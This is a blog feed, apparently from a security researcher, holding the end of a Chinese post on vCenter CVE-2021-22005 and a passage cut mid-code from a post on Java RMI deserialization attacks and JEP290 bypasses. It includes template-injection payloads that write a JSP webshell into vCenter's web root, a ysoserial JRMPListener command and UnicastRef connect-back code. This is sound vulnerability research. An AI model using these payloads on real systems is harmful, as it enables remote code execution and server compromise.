class="hljs-string">&quot;LOGFILE\&quot;</span>)</span></span>)##<br>$narfazj.setFile(\&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp\&quot;)<br></code></pre></td></tr></table></figure><p>调试无问题：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/80.png">  </p><p>burp测试时发现变量已修改，但是文件并未生成</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/81.png">  </p><p>直接使用logger.info()等方法时却还是写入默认文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#set($log = $GLOBAL-logger.logger.parent)##</span><br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">debug</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.warn(<span class="hljs-string">&quot;logbytest&quot;</span>)  <br></code></pre></td></tr></table></figure><p>再次测试发现<code>_fileName</code>修改成功，但是并未创建jsp文件且日志还是写到了原来文件中</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/82.png">  </p><p>说明日志写入时并不是取的<code>_fileName</code>,后面注意到：<code>_delegate.fileName</code>变量的值也是默认<code>/var/log/vmware/analytics/analytics.log</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/83.png">  </p><p>找到<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender#activateOptions()</code>会将<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender#_fileName</code>的值同步给<code>_delegate.fileName</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/84.png">  </p><p>再次尝试下：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs leaf"><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>)</span></span>##<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">narfazj</span> = $<span class="hljs-variable">log</span>.<span class="hljs-variable">getAppender</span>(<span class="hljs-string">&quot;LOGFILE&quot;</span>)</span></span>)##<br>$narfazj.setFile(&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp&quot;)<br>$narfazj.activateOptions()<br></code></pre></td></tr></table></figure><p>发现可以写入了！</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/85.png">  </p><p>注意写完shell之后需要再恢复下fileName变量值日志<code>/var/log/vmware/analytics/analytics.log</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span>(<span class="hljs-variable">$log</span> = <span class="hljs-variable">$GLOBAL</span>-logger.logger.parent)<span class="hljs-comment">##</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span>(<span class="hljs-variable">$narfazj</span> = <span class="hljs-variable">$log</span>.getAppender(<span class="hljs-string">&quot;LOGFILE&quot;</span>))<span class="hljs-comment">##</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.setFile(<span class="hljs-string">&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.activateOptions()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">log.info(\&quot;&lt;%=123%&gt;\&quot;)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.setFile(<span class="hljs-string">&quot;/var/log/vmware/analytics/analytics.log&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.activateOptions()</span><br></code></pre></td></tr></table></figure><p>文章log日志调试部分图片是在分析1day时截的，所以图中的POC与上文分析不完全一致。在测试poc过程当中，断点断到了系统发的请求数据，根据这个也能很快定位到最终的resourceItemToJsonLdMapping对象进行模板注入</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/86.png"></p><p>至此完成了Vmware-Vcenter漏洞CVE-2021-22005 的追踪复现，希望对你有帮助！</p><h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a href="https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee">https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee</a></p><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">https://www.vmware.com/security/advisories/VMSA-2021-0020.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vmware-Vcenter</tag>
      
      <tag>漏洞分析</tag>
      
      <tag>CVE-2021-22005</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论RMI的攻防演进史</title>
    <link href="/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/"/>
    <url>/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/</url>
    
    <content type="html"><![CDATA[<blockquote><p>前些日子的一次比赛碰到攻击RMI服务的漏洞，最终没打下来。当时也被其他任务缠身导致没探究其根本原因。想着近两年各种基于RMI的漏洞又多了起来，而我对其中涉及的很多JDK版本问题、官方修复绕过、分布式垃圾回收相关特性、各种tricks的利用等都懵懵懂懂。趁着假期，索性一次将RMI相关的利用问题搞清楚</p></blockquote><p>本文不涉及太多Debug代码的流水账，那样只会绕来绕去把自己绕晕。而是按照Oracle的官方修复、被绕过、修复、再绕过的思路进行分析。全文讲的RMI攻击对象为注册中心及服务端，至于反向操作造成的客户端反打问题原理类似，这里不做讨论。</p><p>针对RMI服务的利用手法依赖于目标ClassPath存在的Gadget，从JDK更新历史来看可分为三个阶段，第一阶段是在JEP290之前，攻击者可使用bind&#x2F;unbind&#x2F;dirty等操作绑定Gadget完成利用。在第二阶段是在发布JEP290(JDK8u121)至JDK8u241时期，由于JEP290 白名单的限制，进而找出了UnicastRef、UnicastRemoteObject利用链可用于二次反序列化的攻击手法，中间也穿插了对来源地址等的限制及绕过（CVE-2019-2684）。而第三阶段是在JDK8u241之后，攻击RMI服务已经无法利用bind&#x2F;unbind&#x2F;dirty等内置方法完成攻击，只能寄希望于寻找应用层的函数方法，当方法传递的是Object、Remote、Map等类型参数时，还是可以利用其传递构造的恶意对象进行利用。</p><h2 id="1、概念介绍"><a href="#1、概念介绍" class="headerlink" title="1、概念介绍"></a>1、概念介绍</h2><p>先了解下RMI相关名词RPC、RMI、JNDI、JRMP等的解释</p><p>RPC</p><blockquote><p>RPC 全称为 Remote Procedure Call(远程过程调用)，它是一种计算机通信协议，允许像调用本地服务一样去调用远程服务。RPC可以有不同的实现方式，如RMI(远程方法调用)、Hessian等。另外RPC与语言是没有关系的，Java rmi使用的是Socket通信、动态代理反射、Java原生反序列化去实现的RPC框架。即本文要讲解的重点-Java rmi</p></blockquote><p>Java RMI</p><blockquote><p>Java RMI 全程为Java Remote Method Invocation(Java 远程方法调用)。Java RMI是专门为Java提供的远程方法调用机制，远程服务器实现具体方法并提供接口，本地客户端根据接口定义，提供参数即可调用远程方法并获取执行结果，实现了跨域JVM去调用另外一个JVM的对象方法。 </p></blockquote><p>JNDI</p><blockquote><p>JNDI全称为Java Naming and Directory Interface(Java 命名与目录接口)。命名指的是在一个目录系统当中，实现了”服务名称-对象&#x2F;引用”这样的映射对应关系，当客户端根据名称即可查询到相关联的对象&#x2F;引用。目录是一种特殊类型的命名服务，在命名的基础上增加了“属性”的概念，所以客户端也可以根据对象属性操作筛选对象&#x2F;引用。这些对象&#x2F;引用可以存储在不同的命名&#x2F;目录服务当中，如上面提到的远程服务调用RMI、公共对象请求代理架构CORBA、轻量级目录访问协议LDAP、域名服务DNS</p></blockquote><p>JRMP</p><blockquote><p>JRMP全称为Java Remote Method Protocal（Java 远程方法协议）。Java本身对于RMI的实现默认使用JRMP协议，而最近几年的漏洞之王-Weblogic对于RMI的实现使用的是T3协议。一次Java RMI的过程，需要用到JRMP协议去组织数据格式然后通过TCP协议进行传输，达到远程方法调用的目的</p></blockquote><p>2、RMI调用基本流程</p><blockquote><p>一次完整的RMI调用涉及到注册中心Registry、服务端Server、客户端Client三端，服务端首先向注册中心注册创建的远程对象（下图第一二步），接着客户端向注册中心发起查找请求并拿到远程对象的存根（下图第三四步）。RMI的实现引入了Stubs(客户端存根)、Skeletons(服务端骨架)两个概念。当客户端调用远程服务端的对象方法时（下图第五步），实际上会先经过“远程对象的客户本地代理”，这个代理类就是Stubs(客户端存根)，其主要负责将要调用的远程方法名及参数打包、并将该包转发给远程对象所在的服务器（下图第六步）；而在远程服务器调用真正的方法之前，同样也会经过代理类，这个存在于服务端的代理类就是骨架Skeleton，它从Stubs中接受调用并传递给真实的目标方法（下图第七步）。两者对于RMI服务的使用者是隐藏的，使用者不需要关注这部分实现。如下图是一次RMI的调用过程</p></blockquote><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/1.png"></p><p>了解了RMI的调用过程，我们还需要知道：RMI过程中传输的数据均为序列化数据，服务端&#x2F;客户端&#x2F;注册中心在拿到数据后都会进行反序列化操作。如果传输的是我们构造好的恶意序列化数据，就会在反序列化时触发漏洞。关于RMI的大部分攻击都是基于此特性完成的，主要分为：服务端向注册中心的bind操作、客户端向注册中心的lookup操作、客户端向服务端调用“自定义方法”的操作。漏洞利用在此基础上完成。本文主要讨论的是对于注册中心&#x2F;服务端的漏洞利用在JDK中的的攻防历史，涉及多个JDK版本、反序列化Gadget构造技巧、官方的修复与绕过等等知识。</p><p>文章中使用的JDK版本：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">jdk8u112、jdk8u121、jdk8u141、jdk8u191、jdk8u231、jdk8u241<br></code></pre></td></tr></table></figure><h2 id="2、JAVA-RMI与JDK的攻防史"><a href="#2、JAVA-RMI与JDK的攻防史" class="headerlink" title="2、JAVA RMI与JDK的攻防史"></a>2、JAVA RMI与JDK的攻防史</h2><h3 id="1、jdk-lt-8u121-无任何过滤"><a href="#1、jdk-lt-8u121-无任何过滤" class="headerlink" title="1、jdk&lt; 8u121 无任何过滤"></a>1、jdk&lt; 8u121 无任何过滤</h3><h4 id="1-1-bind-x2F-rebind-的利用"><a href="#1-1-bind-x2F-rebind-的利用" class="headerlink" title="1.1 bind&#x2F;rebind 的利用"></a>1.1 bind&#x2F;rebind 的利用</h4><p>服务端使用bind向注册中心注册绑定远程对象，我们可以放置恶意对象完成利用</p><p>sun.rmi.registry.RegistryImpl_Skel#dispatch</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/2.png"></p><p>注册中心端的RegistryImpl_Skel会直接对服务端 bind&#x2F;rebind操作传输过来的对象进行反序列化而没有任何过滤。所以在JDK8u121之前可以直接使用bind&#x2F;rebind操作传输恶意对象进行漏洞利用。这也是ysoserial.exploit.RMIRegistryExploit 利用的原理。因为bind传输的类必须实现Remote接口，可使用动态代理的方式进行解决，ysoserial使用的handler为AnnotationInvocationHandler</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/3.png"></p><h4 id="1-2-DGC-dirty-的利用"><a href="#1-2-DGC-dirty-的利用" class="headerlink" title="1.2 DGC#dirty 的利用"></a>1.2 DGC#dirty 的利用</h4><p>因为在跨虚拟机的情况下，RMI无法直接使用原有JDK的GC机制，而自己实现了DGC（Distributed  Garbage Collection 分布式垃圾回收），在对RMI进行漏洞利用的时候，也会出现经常出现DGC的身影。与上面RMI流程图中提到的一样，DGC也具有Stubs(客户端存根)、Skeletons(服务端骨架)两个概念，涉及的类为：DGCImpl_Stub、DGCImpl_Skel。并且只要启动了RMI服务，那么一定会存在DGC，其传输的数据是序列化数据，参数ObjID为Object类型，可以放置我们的恶意payload。在ysoserial中，DGC对应的利用exp为ysoserial&#x2F;exploit&#x2F;JRMPClient，以下为细节分析</p><p>处理DGC操作的是sun.rmi.transport.DGCImpl_Skel#dispatch方法</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/4.png"></p><p>根据传入的var3值决定是调用clean（0）操作还是dirty（1）操作，在调用真正的远程方法之前会使用readObject()获取参数值，即进行反序列化操作，这也是该漏洞的触发点。而EXP编写的重点是如何把我们构造的恶意序列化数据塞进去。这涉及到DGC通信的一些协议格式，我们要解决的问题本质上来说就是：<strong>模仿客户端通信，将构造的恶意数据塞入数据流，使得服务端通过反序列化操作获取ObjID参数值时触发漏洞</strong>。并且由于DGC对于RMI使用用户来说并不可见，无法像registry可以直接连接去调用内置方法，而是需要自己起socket请求，按照数据格式进行数据填充。</p><p>参考<a href="https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html">rmi-protocol-docs</a>发送的报文格式如下。服务端在接收到客户端传输的数据后，依次解析确认operation指令(Call、Ping、DgcAck)、根据ObjID确认处理的Skel类(RegistryImpl_Skel&#x2F;DGCImpl_Skel&#x2F;自定义)、根据num&#x2F;hash确认要调用的方法、arg为调用方法的参数值。其中ObjID、num、hash、arg都是基于JAVA原生序列化机制生成的序列化数据</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/5.png"></p><p>Header默认值部分在TransportConstants中定义，其中文档中的<code>0x4a 0x52 0x4d 0x49</code> 即sun.rmi.transport.TransportConstants#Magic的值</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/6.png"></p><p>operation:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Call</span>:<span class="hljs-number">80</span> <span class="hljs-number">0</span>x50 远程方法调用<br><span class="hljs-attribute">Ping</span>:<span class="hljs-number">82</span> <span class="hljs-number">0</span>x52  探测存活请求<br><span class="hljs-attribute">DgcAck</span>:<span class="hljs-number">84</span> <span class="hljs-number">0</span>x54 dgc确认请求<br></code></pre></td></tr></table></figure><p>ObjID：Registry与DGC的ObjID是固定值，在如下函数中被定义</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">Registry<br>rt<span class="hljs-selector-class">.jar</span>!sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span><span class="hljs-selector-class">.RegistryImpl</span><span class="hljs-selector-id">#id</span>:id = new <span class="hljs-built_in">ObjID</span>(<span class="hljs-number">0</span>);<br><br>DGC<br>rt<span class="hljs-selector-class">.jar</span>!sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCImpl</span><span class="hljs-selector-id">#dgcID</span>:dgcID = new <span class="hljs-built_in">ObjID</span>(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>num：Registry与DGC中的操作及对应值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Registry</span>:<br><span class="hljs-attribute">bind</span>   <span class="hljs-number">0</span><br><span class="hljs-attribute">list</span>   <span class="hljs-number">1</span><br><span class="hljs-attribute">lookup</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">rebind</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">unbind</span> <span class="hljs-number">4</span><br><br><span class="hljs-attribute">DGC</span>:<br><span class="hljs-attribute">clean</span>  <span class="hljs-number">0</span><br><span class="hljs-attribute">dirty</span>  <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>hash：Registry与DGC中hash值为固定值，自定义方法的hash值为方法签名的sha1</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Registry:<br>sun.rmi.registry.RegistryImpl_Skel#<span class="hljs-built_in">int</span>erfaceHash:<span class="hljs-built_in">int</span>erfaceHash = <span class="hljs-number">4905912898345647071</span>L;<br><br>DGC:<br>sun.rmi.transport.DGCImpl_Skel#<span class="hljs-built_in">int</span>erfaceHash:<span class="hljs-built_in">int</span>erfaceHash = <span class="hljs-number">-669196253586618813</span>L;<br></code></pre></td></tr></table></figure><p>sun.rmi.server.UnicastServerRef#dispatch 根据客户端传过来的num值进行判断，如果≥0，表示为Registry&#x2F;DGC默认方法 调用sun.rmi.server.UnicastServerRef#oldDispatch进行处理，如果客户端想远程调用自定义方法，则需要在定义时将属性值num设为负值、服务端在接收到客户端发送的call指令后根据num及<code>hashToMethod_Map.get(方法hash值)</code>确认目标方法，最后通过反射进行调用</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/7.png"></p><p>而arg为远程方法的参数值，是基于JAVA原生序列化机制生成的序列化数据。在DGC层clean&#x2F;dirty方法的ObjID参数为Object类型，可以承载我们的恶意payload，其对应的EXP为ysoserial.exploit.JRMPClient，数据构造部分在makeDGCCall()中</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/8.png"></p><p>至此即可通过DGC攻击RMI服务</p><h3 id="2、jdk-x3D-8u121-（JEP290）"><a href="#2、jdk-x3D-8u121-（JEP290）" class="headerlink" title="2、jdk &#x3D; 8u121 （JEP290）"></a>2、jdk &#x3D; 8u121 （JEP290）</h3><p>在jdk&#x3D;8u121的时候，ORACLE官方做了两件事情。分别影响的是”远程加载类攻击客户端手法“、”对注册中心及DGC的反序列化攻击手法（加上了全局白名单）“。JEP290对于Java原生反序列化的影响暂不讨论，本文主要分析JEP290对RMI Registry、RMI DGC等攻击利用方式的影响。</p><h4 id="2-1-限制1：RMI-Registry、RMI-DGC-增加了反序列化白名单"><a href="#2-1-限制1：RMI-Registry、RMI-DGC-增加了反序列化白名单" class="headerlink" title="2.1 限制1：RMI Registry、RMI DGC 增加了反序列化白名单"></a>2.1 限制1：RMI Registry、RMI DGC 增加了反序列化白名单</h4><p>RMI Registry(注册表)、RMI DGC（分布式垃圾收集器）都默认启用了反序列化filter机制，只允许反序列化白名单中的特定类。这两者与我们对于RMI服务的攻击利用息息相关。</p><p>a.RMI Registry内置了白名单过滤器，只允许在注册表中绑定（bind）白名单中的类的实例</p><p>其验证逻辑在sun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl.java#registryFilter。另外可以自行编辑<code>sun.rmi.registry.registryFilter</code>系统属性配置黑白名单为RMI注册表增加额外保护</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/9.png"></p><p>b.RMI DGC与RMI Registry类似，也内置了反序列化的白名单，包括：<code>java.rmi.server.ObjID</code>、<code>java.rmi.server.UID</code>、<code>java.rmi.dgc.VMID</code>和<code>java.rmi.dgc.Lease</code>。这部分逻辑写在sun.rmi.transport.DGCImpl#checkInput</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/10.png"></p><h4 id="2-2-限制2：限制了-RMI-远程加载机制"><a href="#2-2-限制2：限制了-RMI-远程加载机制" class="headerlink" title="2.2  限制2：限制了 RMI 远程加载机制"></a>2.2  限制2：限制了 RMI 远程加载机制</h4><p>JDK RMI的远程Reference信任机制变化：环境变量com.sun.jndi.rmi.object.trustURLCodebase默认为false，意味着我们不能通过rmi的JNDI方式去攻击客户端了</p><p>有关JNDI注入修复及绕过分析可参考之前文章：<a href="https://pwnull.github.io/2022/jndi-injection-history/">当我们谈论JNDI注入时，我们在谈论什么</a></p><h4 id="2-3-绕过1：使用JEP290白名单中的UnicastRef完成绕过"><a href="#2-3-绕过1：使用JEP290白名单中的UnicastRef完成绕过" class="headerlink" title="2.3 绕过1：使用JEP290白名单中的UnicastRef完成绕过"></a>2.3 绕过1：使用JEP290白名单中的UnicastRef完成绕过</h4><p>总结：<strong>JEP290是对RMI Registry与RMI DGC做的白名单限制，并没有对JRMP回连逻辑做限制，而白名单中的UnicastRef类会建立JRMP请求并对返回数据做反序列化处理，所以导致二次反序列化问题</strong></p><p>JEP290 加上了反序列化白名单：sun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl.java#registryFilter</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">String</span><br><span class="hljs-built_in">Number</span><br>Remote<br><span class="hljs-built_in">Proxy</span><br>UnicastRef<br>RMIClientSocketFactory<br>RMIServerSocketFactory<br>ActivationID<br>UID<br></code></pre></td></tr></table></figure><p>前辈在白名单中找到UnicastRef类，此类的readExternal()方法会构建LiveRef对象（用于建立JRMP连接），sun.rmi.registry.RegistryImpl_Skel调用dispatchsun.rmi.transport.StreamRemoteCall#releaseInputStream释放输入流的时候会建立JRMP连接，并从数据流中取出数据进行反序列化操作，所以我们可利用JEP290白名单中的UnicastRef类进行一个二次反序列化绕过限制。利用思路如下：</p><h5 id="2-3-1-UnicastRef-链利用复现"><a href="#2-3-1-UnicastRef-链利用复现" class="headerlink" title="2.3.1 UnicastRef 链利用复现"></a>2.3.1 UnicastRef 链利用复现</h5><p>1、攻击者搭建恶意JRMP服务器，并放置构造的恶意序列数据等待目标服务器来取。这部分逻辑对应ysoserial.exploit.JRMPListener类，使用命令为</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">9999</span> CommonsBeanutils1 <span class="hljs-string">&quot;mspaint&quot;</span><br></code></pre></td></tr></table></figure><p>2、RMI Registry反序列化UnicastRef类，从UnicastRef#readExternal()一直调用到StreamRemoteCall#executeCall，与恶意JRMP服务器建立链接，并取回序列化数据进行反序列化操作，这时候的RMI Registry相当于客户端</p><p>指定jrmp 连接基础代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">java.rmi.server.ObjID objId = <span class="hljs-keyword">new</span> java.rmi.server.<span class="hljs-constructor">ObjID()</span>;<br>sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class="hljs-keyword">new</span> sun.rmi.transport.tcp.<span class="hljs-constructor">TCPEndpoint(<span class="hljs-params">host</span>, <span class="hljs-params">port</span>)</span>;<br>sun.rmi.transport.LiveRef liveRef = <span class="hljs-keyword">new</span> sun.rmi.transport.<span class="hljs-constructor">LiveRef(<span class="hljs-params">objId</span>, <span class="hljs-params">endpoint</span>, <span class="hljs-params">false</span>)</span>;<br>return <span class="hljs-keyword">new</span> sun.rmi.server.<span class="hljs-constructor">UnicastRef(<span class="hljs-params">liveRef</span>)</span>;<br></code></pre></td></tr></table></figure><p>3、RMI Registry反序列化我们构造好的恶意序列化数据，完成漏洞利用</p><h5 id="2-3-2-UnicastRef-包装恶意Padyload"><a href="#2-3-2-UnicastRef-包装恶意Padyload" class="headerlink" title="2.3.2 UnicastRef 包装恶意Padyload"></a>2.3.2 UnicastRef 包装恶意Padyload</h5><p>UnicastRef gadget chain：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>具体调用链如下，readExternal()会向ConnectionInputStream对象中存储Ref信息(包含jrmp链接的host、port等信息)，然后再调用sun.rmi.transport.StreamRemoteCall#releaseInputStream一直到sun.rmi.server.UnicastRef#invoke中对jrmp服务端返回的数据进行反序列化操作。这两处操作需要注意下，后面的JDK修复也是针对这两处进行修复的</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\server\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRef</span>.</span></span><span class="hljs-keyword">class</span><br>public void read<span class="hljs-constructor">External(ObjectInput <span class="hljs-params">var1</span>)</span> throws IOException, ClassNotFoundException &#123;<br>        this.<span class="hljs-built_in">ref</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LiveRef</span>.</span></span>read(var1, <span class="hljs-literal">false</span>);<br>&#125;<br><br><br><br>jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\transport\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LiveRef</span>.</span></span><span class="hljs-keyword">class</span><br>public static LiveRef read(ObjectInput var0, boolean var1) throws IOException, ClassNotFoundException &#123;<br>        TCPEndpoint var2;<br>        <span class="hljs-keyword">if</span> (var1) &#123;<br>            var2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TCPEndpoint</span>.</span></span>read(var0);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TCPEndpoint</span>.</span></span>read<span class="hljs-constructor">HostPortFormat(<span class="hljs-params">var0</span>)</span>;<br>        &#125;<br><br>        ObjID var3 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjID</span>.</span></span>read(var0);<br>        boolean var4 = var0.read<span class="hljs-constructor">Boolean()</span>;<br>        LiveRef var5 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">LiveRef(<span class="hljs-params">var3</span>, <span class="hljs-params">var2</span>, <span class="hljs-params">false</span>)</span>;<br>        <span class="hljs-keyword">if</span> (var0 instanceof ConnectionInputStream) &#123;<br>            ConnectionInputStream var6 = (ConnectionInputStream)var0;<br>            var6.save<span class="hljs-constructor">Ref(<span class="hljs-params">var5</span>)</span>;                                            <span class="hljs-comment">//1</span><br>            <span 